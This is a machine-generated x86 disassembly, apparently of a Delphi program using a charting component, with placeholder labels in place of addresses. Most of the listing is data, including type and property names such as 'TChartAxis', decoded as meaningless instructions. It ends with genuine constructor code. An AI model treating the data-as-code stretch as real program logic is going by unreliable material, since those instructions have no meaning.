add [ eax + eax ] 0x10
arpl [ ebp + 0x61 ] cx
or [ ebp + 0x45 ] dl
js r-xdata
add [ ebp + esi + 0x32dc0040 ] dl
jae r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
insb
dec esi
outsd
outsb
or [ gs : ecx + 0x6c ] dh
push esi
popad
insb
jne r-xdata
add [ ecx ] al
jae r-xdata
js r-xdata
insd
jne r-xdata
xchg esp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6c ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6c ] ch
inc edi
add al ch
add [ eax ] al
add [ eax - 0x6d ] ah
inc edi
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
imul ebp [ esi + 0x65 ] 0x5c900000
inc edi
add [ edi ] al
or dl [ ebx + eax * 2 + 0x68 ]
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ ebx + 0xe40047 ] cl
add [ eax ] al
loopne r-xdata
call 0x747db7c
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
cwde
dec edx
inc ecx
add [ eax + 0x7400414a ] ah
mov esi 0xe0047
pop es
je r-xdata
jbe r-xdata
add [ fs : eax ] dl
inc eax
add [ eax ] al
add bh bh
xor al 0xb4
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
popad
insb
jne r-xdata
jae r-xdata
add [ eax ] dl
inc eax
add [ esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
adc [ ecx + 0x75 ] al
je r-xdata
inc ecx
js r-xdata
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
inc edi
inc ecx
add [ ebp + esi + 0x35980040 ] cl
add [ esi + edi * 4 + 0x47 ] dh
add [ edx ] cl
push esp
inc ebx
push 0x41747261
js r-xdata
outsd
insd
inc ebx
push 0x41747261
js r-xdata
xor eax 0x32dc0040
xchg esp eax
outsd
insb
dec ebp
popad
jb r-xdata
or cl [ ecx + 0x62 ]
insb
jb r-xdata
add [ esi ] al
inc ebx
outsb
je r-xdata
dec ecx
push esp
imul ebp [ ebp + 0x65 ] r-xdata
cmp al 0x0
add bh bh
sbb al 0xb4
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47040007 ] al
jae r-xdata
push es
add [ 0x63617845 ] cl
je r-xdata
outsd
jb r-xdata
add [ esi ] cl
inc esp
popad
je r-xdata
insd
popad
je r-xdata
add [ eax ] al
push es
jae r-xdata
inc ecx
jae r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
mov esp 0x60004010
add [ eax ] al
add [ eax + edx + 0x640040 ] bh
add [ eax ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
pop es
je r-xdata
add [ esp + ecx * 2 ] cl
popad
bound esp [ ebp + 0x6c ]
jae r-xdata
outsd
outsb
je r-xdata
add bh bh
clc
mov bh 0x47
dec esp
popad
add [ fs : eax ] dl
inc eax
add [ ecx ] al
add bh bh
insb
les eax [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or eax [ eax ]
push es
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc edi
adc [ eax ] al
inc esp
add [ eax ] al
push eax
mov [ edi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or ecx [ ecx + 0x62 ]
insb
jae r-xdata
jb r-xdata
adc [ eax ] al
lea eax [ eax ]
add bh bh
cwde
lds eax [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ ecx + 0x6e ] cl
popad
jb r-xdata
add al 0x47
popad
je r-xdata
add [ eax ] al
or [ eax ] al
or al 0x47
jb r-xdata
add [ eax ] al
push esp
imul ebp [ ebp + 0x65 ] 0x6d726f46
popad
je r-xdata
add [ 0x61440e00 ] 0x74
push esp
arpl [ ebp + 0x69 ] cx
outsb
imul ebp [ ebp + 0x75 ] 0x4723406d
add [ eax ] ch
add [ eax ] al
js r-xdata
dec ebp
popad
xchg esp eax
inc edi
add ah ah
xchg ebx eax
inc edi
add [ edi ] ah
add [ eax ] cl
push esp
inc ebp
outsb
imul ebp [ bp + 0x65 ] 0x10000027
inc eax
add [ eax + eax ] al
add bh bh
mov al [ 0x10047c4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x75 ] eax
je r-xdata
add [ esp + esi * 4 + 0x47 ] dl
outsb
imul ebp [ bp + 0x65 ] 0x5c900000
xchg ebx eax
inc edi
add [ ecx + 0x41 ] dl
add [ eax ] al
add [ eax ] cl
push esp
inc ebp
add [ esi + edi * 4 + 0x47 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x600040 ] bh
add [ eax ] al
mov esp 0x64004010
add [ eax ] al
insb
push esp
js r-xdata
insb
outsb
inc ecx
js r-xdata
adc [ eax ] al
push 0x0
insb
jae r-xdata
jne r-xdata
push cs
add [ edi ] cl
dec esp
popad
bound esp [ ebp + 0x6c ]
jae r-xdata
jae r-xdata
outsb
insb
add al 0xb9
inc ecx
add [ eax ] cl
add bh bh
add ah 0x47
add [ eax + 0x47c4 ] dl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c0a000d ] al
popad
bound esp [ ebp + 0x6c ]
bound esp [ ebp + 0x6c ]
jae r-xdata
outsb
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
lodsb [ fs : esi ]
adc [ eax ] al
or [ eax ] al
add bh bh
cmp al cl
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49090009 ] al
dec [ eax - 0x4c ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
add [ fs : eax ] al
jmp [ edi + esi * 4 + 0x47 ]
adc [ eax ] al
push 0xf8ff0000
mov [ edi ] 0x1
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] eax
add [ eax ] al
jae r-xdata
add [ eax + 0x41040003 ] al
add [ eax ] al
insd
popad
je r-xdata
add [ eax ] dl
push esp
inc ebx
jne r-xdata
adc [ eax ] al
add [ fs : eax ] al
xchg ebx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x45 ] dl
outsb
imul ebp [ bp + 0x65 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xe8004793
add [ eax ] al
[ ebp + eax * 8 + 0x10047 ]
imul edi [ edx + 0x65 ] r-xdata
pop eax
adc al [ eax ]
or cl [ ecx + 0x62 ]
insb
push ebx
je r-xdata
jae r-xdata
add [ eax ] dl
jo r-xdata
jae r-xdata
add [ eax ] al
je r-xdata
dec esp
les eax [ edi ]
adc [ eax ] al
pushad
add [ eax ] al
inc [ ebp + eax * 8 - 0x3ad3ffb9 ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41100004 ] al
js r-xdata
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x41
arpl [ eax ] ax
adc [ eax ] al
add eax 0xfcff0000
les eax [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] eax
adc [ ecx + 0x75 ] al
je r-xdata
add [ eax ] al
inc eax
add [ eax ] ah
add [ eax ] al
[ eax ]
mov [ edi ] 0x1
add [ eax ] al
add [ eax ] al
insb
add [ gs : eax ] dl
add [ eax ] al
dec [ eax + ecx * 8 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
push eax
add [ eax ] al
call [ edi + eax * 8 + 0x47 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx ] 0x0
add [ eax ] al
adc [ eax ] al
adc [ ecx + 0x62 ] cl
push ss
je r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] al
adc [ eax ] eax
or cl [ ecx + 0x62 ]
insb
add [ eax ] 0x0
dec esp
imul ebp [ esi + 0x65 ] r-xdata
dec esp
add [ eax ] al
jmp esp
inc ecx
add [ eax ] dl
insd
popad
je r-xdata
add [ edi ] al
dec ebp
imul ebp [ esi + 0x69 ] 0x546d756d
and [ edi ] al
insb
add [ eax ] al
[ eax ]
insd
imul esp [ ebx + 0x54 ] 0x24004010
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or ecx [ edi + ebp * 2 + 0x67 ]
popad
je r-xdata
jb r-xdata
popad
outsd
outsb
push esp
adc [ eax ] al
push esp
add [ eax ] al
sub_47972b
mov esp 0x10047c7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or cl [ ecx + 0x62 ]
insb
jae r-xdata
add [ eax ] al
[ ebp + eax * 8 + 0x10047 ]
imul edi [ edx + 0x65 ] r-xdata
pop eax
add [ eax ] al
dec [ eax + ecx * 8 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or cl [ ecx + 0x62 ]
insb
push ebx
je r-xdata
add [ eax ] al
insb
add [ gs : eax ] dl
inc eax
add [ eax ] ah
add [ eax ] al
[ eax ]
mov [ edi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or ecx [ edi + ebp * 2 + 0x67 ]
popad
jb r-xdata
push ss
je r-xdata
add [ edi ] al
dec ebp
imul ebp [ esi + 0x69 ] 0x546d756d
and [ edi ] al
insb
add [ eax ] al
[ eax ]
insd
imul esp [ ebx + 0x54 ] 0x24004010
sub_479a68
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ edx + 0x47 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xe800479a
add [ eax ] al
add [ eax - 0x6d ] ah
inc edi
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
push esp
mov ah 0x47
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ esi + edi * 4 + 0x47 ] dh
add [ edi ] cl
push esp
inc ebx
push 0x44747261
jo r-xdata
je r-xdata
push 0x73697841
rcr [ edx + 0xf070047 ] 0x1
push esp
inc ebx
push 0x44747261
jo r-xdata
add [ eax + eax ] 0x10
arpl [ ebp + 0x61 ] cx
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push 0x73697841
mov al 0x9a
inc edi
add ah ah
xchg ebx eax
inc edi
add [ ebx ] ah
add [ eax ] cl
push esp
inc ebp
outsb
imul ebp [ bp + 0x65 ] 0x10000023
inc eax
add [ eax + eax ] al
add bh bh
mov al [ 0x10047c4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x75 ] eax
je r-xdata
add [ ecx ] al
jae r-xdata
js r-xdata
insd
jne r-xdata
add [ esi ] cl
inc esp
popad
je r-xdata
insd
popad
je r-xdata
add [ eax ] al
insd
popad
je r-xdata
push esp
lodsb [ fs : esi ]
adc [ eax ] al
or [ eax ] al
add bh bh
cmp al cl
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
popad
insb
jne r-xdata
jae r-xdata
add al [ eax ]
adc [ ecx + 0x75 ] al
je r-xdata
add [ eax ] dl
inc eax
add [ esi ] al
add [ eax ] al
add [ eax + 0x49090008 ] al
outsb
arpl [ edx + 0x65 ] si
add [ eax ] al
push esp
imul ebp [ ebp + 0x65 ] 0x6d726f46
popad
je r-xdata
add [ 0x61440e00 ] 0x74
push esp
add [ eax + 0x41040003 ] al
arpl [ ebp + 0x69 ] cx
outsb
imul ebp [ ebp + 0x75 ] 0x4723406d
add [ eax ] ch
add [ eax ] al
add [ eax ] eax
add [ eax ] al
jae r-xdata
js r-xdata
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x41
arpl [ eax ] ax
adc [ eax ] al
add eax 0xfcff0000
les eax [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] eax
adc [ ecx + 0x75 ] al
je r-xdata
or eax 0x614c0f00
bound esp [ ebp + 0x6c ]
jae r-xdata
outsb
insb
add al 0xb9
inc ecx
add [ eax ] cl
add bh bh
add ah 0x47
add [ eax + 0x47c4 ] dl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c0a000c ] al
popad
bound esp [ ebp + 0x6c ]
adc [ eax ] al
lea eax [ eax ]
add bh bh
cwde
lds eax [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] eax
or [ ecx + 0x6e ] cl
jbe r-xdata
jb r-xdata
push esp
imul ebp [ ebp + 0x65 ] r-xdata
cmp al 0x0
add bh bh
sbb al 0xb4
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47040007 ] al
jae r-xdata
push es
add [ 0x63617845 ] cl
je r-xdata
outsd
jb r-xdata
adc [ eax ] al
push 0xf8ff0000
mov [ edi ] 0x1
add [ eax ] al
add [ eax + 0x1 ] al
jb r-xdata
popad
dec esp
les eax [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
pushad
add [ eax ] al
inc [ ebp + eax * 8 - 0x3ad3ffb9 ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41100004 ] al
inc ecx
add [ eax ] dl
insd
popad
insb
jne r-xdata
add [ esp + ecx * 2 ] cl
popad
bound esp [ ebp + 0x6c ]
jae r-xdata
outsd
outsb
je r-xdata
jae r-xdata
or cl [ ecx + 0x62 ]
insb
jb r-xdata
add bh bh
clc
mov bh 0x47
add [ fs : eax ] dl
inc eax
add [ ecx ] al
add bh bh
insb
les eax [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
jae r-xdata
jb r-xdata
add al 0x47
popad
je r-xdata
jae r-xdata
bound esp [ ebp + 0x6c ]
insd
outsb
je r-xdata
add [ eax ] dl
jo r-xdata
add [ eax ] al
je r-xdata
jae r-xdata
insb
outsb
inc ecx
js r-xdata
adc [ eax ] al
push 0x0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc edi
adc [ eax ] al
inc esp
add [ eax ] al
push eax
mov [ edi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or ecx [ ecx + 0x62 ]
insb
dec [ eax - 0x4c ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
add [ fs : eax ] al
jmp [ edi + esi * 4 + 0x47 ]
adc eax 0x694d0700
outsb
imul ebp [ ebp + 0x75 ] 0x4720546d
add [ eax + eax ] ch
je r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] al
[ ebp + eax * 8 + 0x10047 ]
imul edi [ edx + 0x65 ] r-xdata
pop eax
add [ eax ] al
adc [ eax ] al
or cl [ ecx + 0x62 ]
insb
add [ eax ] 0x0
dec esp
imul ebp [ esi + 0x65 ] r-xdata
dec esp
add [ eax ] al
jmp esp
adc [ eax ] eax
or cl [ ecx + 0x62 ]
insb
push ebx
je r-xdata
jae r-xdata
[ eax ]
add [ edi ] al
dec ebp
imul ebp [ esi + 0x69 ] 0x546d756d
and [ edi ] al
insb
add [ eax ] al
insd
imul esp [ ebx + 0x54 ] 0x24004010
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or ecx [ edi + ebp * 2 + 0x67 ]
popad
je r-xdata
add [ eax ] al
inc eax
add [ eax ] ah
add [ eax ] al
[ eax ]
mov [ edi ] 0x1
add [ eax ] al
add [ eax ] al
insb
add [ gs : eax ] dl
add [ eax ] al
dec [ eax + ecx * 8 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jae r-xdata
adc [ eax ] al
push eax
add [ eax ] al
call [ edi + eax * 8 + 0x47 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx ] 0x0
add [ eax ] al
lldt [ eax ]
dec esp
popad
bound esp [ ebp + 0x6c ]
jb r-xdata
popad
outsd
outsb
push esp
adc [ eax ] al
push esp
add [ eax ] al
sub_479d61
mov esp 0x10047c7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or cl [ ecx + 0x62 ]
insb
jae r-xdata
add [ eax ] al
[ ebp + eax * 8 + 0x10047 ]
imul edi [ edx + 0x65 ] r-xdata
pop eax
add [ eax ] al
dec [ eax + ecx * 8 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or cl [ ecx + 0x62 ]
insb
push ebx
je r-xdata
add [ eax ] al
insb
add [ gs : eax ] dl
inc eax
add [ eax ] ah
add [ eax ] al
[ eax ]
mov [ edi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or ecx [ edi + ebp * 2 + 0x67 ]
popad
jb r-xdata
adc eax 0x694d0700
outsb
imul ebp [ ebp + 0x75 ] 0x4720546d
add [ eax + eax ] ch
je r-xdata
[ eax ]
add [ edi ] al
dec ebp
imul ebp [ esi + 0x69 ] 0x546d756d
and [ edi ] al
insb
add [ eax ] al
insd
imul esp [ ebx + 0x54 ] 0x24004010
sub_479dd7
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
adc eax [ eax ]
cmovl ebp [ edi + 0x67 ]
popad
jb r-xdata
imul ebp [ esi + 0x6f ] 0x69724772
je r-xdata
add bh bh
mov ah 0xca
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
pop ss
add [ esi ] cl
dec ebp
imul ebp [ esi + 0x6f ] 0x63695472
imul eax [ ebx + 0x6f ] 0x75
outsb
outsd
jb r-xdata
insd
imul esp [ ebx + 0x42 ] 0xac657361
adc [ eax ] al
adc [ eax ] al
add bh bh
je r-xdata
add bh bh
in al 0xb7
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
rsqrtps xmm5 [ edi + 0x75 ]
outsb
inc esi
imul esi [ edx + 0x73 ] 0x62614c74
insb
adc [ eax ] al
je r-xdata
dec ebp
imul ebp [ esi + 0x6f ] 0x63695472
imul ecx [ ebp + 0x6e ] 0x67
jb r-xdata
insd
imul esp [ ebx + 0x54 ] 0x24004010
add [ eax ] al
[ ebp + eax * 8 + 0x10047 ]
inc edi
add [ eax + 0x47bb ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d070014 ] al
popad
js r-xdata
popad
bound esp [ ebp + 0x6c ]
jae r-xdata
outsb
add bh bh
mov al [ 0x10047ca ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
sbb [ eax ] al
cmovge ebp [ ecx + 0x6e ]
outsd
jb r-xdata
add [ edi ] cl
push esp
imul esp [ ebx + 0x6b ] 0x656e6e49
jb r-xdata
fsub [ ecx ]
inc edi
add [ eax ] bh
add bh bh
add al 0xb4
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d0a0019 ] al
imul ebp [ esi + 0x6f ] 0x63695472
imul esi [ ebx ] 0x10
inc eax
add [ eax ] al
sbb [ ecx ] 0x0
or cl [ ebp + 0x69 ]
outsb
outsd
jb r-xdata
push esp
adc [ eax ] al
jo r-xdata
je r-xdata
push esp
imul esp [ ebx + 0x6b ] 0x6e756f43
insd
jne r-xdata
outsb
insb
jns r-xdata
push ds
add [ 0x6b636954 ] al
jae r-xdata
push esp
adc [ eax ] al
mov [ eax ] al
add bh bh
mov edx cs
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ eax + eax ] bl
or dl [ ecx + ebp * 2 + 0x63 ]
imul ecx [ ebp + 0x6e ] 0x67
je r-xdata
push esp
adc [ eax ] al
test [ eax ] al
add bh bh
enter 0x47ca 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax [ eax ]
andps xmm5 [ ecx + 0x63 ]
imul ecx [ ecx + 0x6e ] 0x6e
jb r-xdata
popad
bound esp [ ebp + 0x6c ]
je r-xdata
imul esp [ ebx + 0x6b ] 0x676e654c
je r-xdata
outsb
add [ ecx ] ch
imul esp [ ebx + 0x6b ] 0x40100073
outsb
lodsb [ esi ]
adc [ eax ] al
sbb [ eax ] al
add bh bh
fmul st0
inc edi
add [ ebx + edi * 4 + 0x47 ] bl
add [ eax - 0x80000000 ] al
adc eax 0x694d0700
outsb
imul ebp [ ebp + 0x75 ] 0x4720546d
add [ eax + eax ] ch
[ eax ]
or al 0xb8
and [ edi ] eax
jl r-xdata
and [ edi ] eax
add [ eax ] 0x0
call [ eax ]
jb r-xdata
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsb
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x69541000
arpl [ ebx + 0x4f ] bp
outsb
dec esp
add [ eax ] dl
inc eax
add [ eax + eax - 0x47f30100 ] cl
mov ah 0x47
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540a001f ] al
imul esp [ ebx + 0x6b ] 0x6e6e4973
add bh bh
clc
mov bl 0x47
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5405001e ] al
imul esp [ ebx + 0x6b ] 0x4721dc73
add [ eax + 0x10ff0000 ] al
add [ eax ] al
call eax
mov [ edi ] 0x1
add [ eax ] al
add [ eax ] al
and [ eax ] eax
or [ ecx + ebp * 2 + 0x74 ] edx
insb
push ebx
imul edi [ edx + 0x65 ] r-xdata
xchg esp eax
add [ eax ] al
jmp [ eax + ecx * 8 ]
xchg edx eax
inc edi
add [ eax ] dh
add [ eax ] al
sub_47aa81
inc ecx
inc ecx
add ah ah
inc ebx
inc ecx
add [ eax ] cl
inc esi
inc ecx
add [ edx + eax * 2 + 0x41 ] al
add al al
inc edx
inc ecx
add [ eax ] dl
push esp
inc ebx
push 0x56747261
popad
insb
jne r-xdata
push 0x72655074
dec esp
imul esi [ ebx + 0x74 ] r-xdata
lodsb [ esi ]
stosb [ edi ]
inc edi
add [ ebx ] al
adc [ esp + ecx * 2 + 0x65 ] dl
outsb
push esp
js r-xdata
or [ ebp + 0x45 ] dl
outsb
imul ebp [ bp + 0x65 ] 0x7000408d
stosd [ edi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
je r-xdata
add [ eax ] al
add [ esp + ebp * 4 - 0x52dbffb9 ] bh
push ebx
je r-xdata
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax + 0x74004805 ] al
adc eax 0x16540048
dec eax
add al dh
sbb [ eax ] cl
call 0x2847f3dc
adc eax 0x1a9c0048
dec eax
add [ eax + 0x1a ] bh
dec eax
add [ edx + ebx + 0x48 ] bh
add [ ebx + ecx + 0x48 ] cl
add ah ch
sbb al 0x48
add [ eax + 0x14 ] ch
dec eax
add [ eax ] dl
sub ecx [ eax ]
int3
pop eax
push esi
popad
insb
jne r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dh
lodsb [ esi ]
lodsd [ esi ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0xffffffffa8000000 ] al
stosb [ edi ]
inc edi
add [ eax ] cl
insb
je r-xdata
dec eax
add [ eax ] dl
xor ecx [ eax ]
fadd [ edi ]
inc edi
add [ eax ] dl
lodsd [ esi ]
push eax
insb
popad
imul ebp [ esi + 0xc ] 0x4c73746c
je r-xdata
add [ eax ] cl
add [ eax ] eax
add [ esp + ebp ] al
add [ ebp * 4 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul [ edi + eax * 2 + 0x47ad1000 ]
popad
insb
jne r-xdata
inc edi
or eax 0x5273746c
imul esp [ edi + 0x68 ] 0x6c615674
jne r-xdata
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
cwde
xor eax 0x9e740040
push cs
insb
je r-xdata
inc eax
add al bh
xor al [ eax ]
cld
xor ecx [ eax ]
cwde
dec edx
inc ecx
add [ eax ] dl
dec esp
je r-xdata
inc ecx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
or [ ecx ] al
add [ eax ] al
add al 0x2c
jb r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
outsb
je r-xdata
or [ esp + esi * 2 + 0x73 ] ebp
insb
je r-xdata
or [ eax ] cl
daa
dec eax
add [ eax + 0x33 ] cl
dec eax
add al bl
pop es
arpl [ ebp + 0x6e ] sp
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x72655074
sub_47b0f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47b149
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0xc ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b150
lea eax [ ebp - 0x4 ]
call sub_404094
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_477504
mov [ ebx + 0xc ] esi
mov eax ebx
call sub_478858
sub_47b168
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov [ edi + 0x90 ] esi
mov [ edi + 0x41 ] 0x1
mov [ edi + 0x24 ] 0xa
mov [ edi + 0x4 ] 0x1
mov [ edi + 0x5 ] 0x1
mov [ edi + 0x6 ] 0x1
mov [ edi + 0x50 ] 0xa
lea edx [ edi + 0x60 ]
mov eax [ rw-data ]
call sub_405ca4
mov [ edi + 0x58 ] 0x0
mov [ edi + 0x4c ] 0x1
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
call sub_47745c
mov [ edi + 0x48 ] eax
mov [ edi + 0x8c ] 0x1
xor eax eax
mov [ edi + 0xd0 ] eax
mov ecx [ edi + 0x90 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_478778
mov esi eax
mov [ edi + 0x30 ] esi
mov [ esi + 0x10 ] edi
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472b7c
mov [ edi + 0x7c ] eax
mov [ edi + 0x88 ] 0x4
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472b7c
mov [ edi + 0x78 ] eax
mov [ edi + 0x74 ] 0x2
mov [ edi + 0x70 ] 0x3
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472b7c
mov [ edi + 0x80 ] eax
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472b24
mov [ edi + 0x3c ] eax
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472ad8
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472bcc
mov [ edi + 0x28 ] eax
